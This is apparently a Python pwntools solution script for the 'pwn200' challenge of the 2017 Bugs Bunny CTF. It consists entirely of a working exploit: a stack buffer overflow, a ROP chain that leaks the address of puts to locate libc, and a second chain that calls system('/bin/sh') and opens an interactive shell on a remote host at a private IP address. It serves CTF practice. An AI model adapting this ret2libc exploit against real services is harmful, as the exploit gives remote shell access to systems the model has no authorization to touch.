# 2017 bugs_bunny_ctf
from pwn import *
import time

context = 'i386'
pr = 0x0804859b# : pop ebp ; ret
ppr = 0x0804859a# : pop edi ; pop ebp ; ret

e = ELF('./pwn200')
libc = e.libc
libc = ELF('./libc.so')
#r = process('./pwn200')
r = remote('192.168.47.100', '17200')

def packAll(rop):
    return flat([p32(x) for x in rop])

payload = 'A'*(0x18+0x4)

# leak libc
rop = []
rop += [e.plt['puts'], pr, e.got['puts']]
rop += [0x080484d6]
payload += packAll(rop)
r.sendline(payload)
r.recvuntil('solve it :D?\n')
puts = u32(r.recv()[:4])
libc_base = puts-libc.symbols['puts']

# rop
rop = []
rop += [libc_base + libc.symbols['system'], 0, libc_base + next(libc.search('/bin/sh'))]
payload += packAll(rop)
r.sendline(payload)

r.interactive()


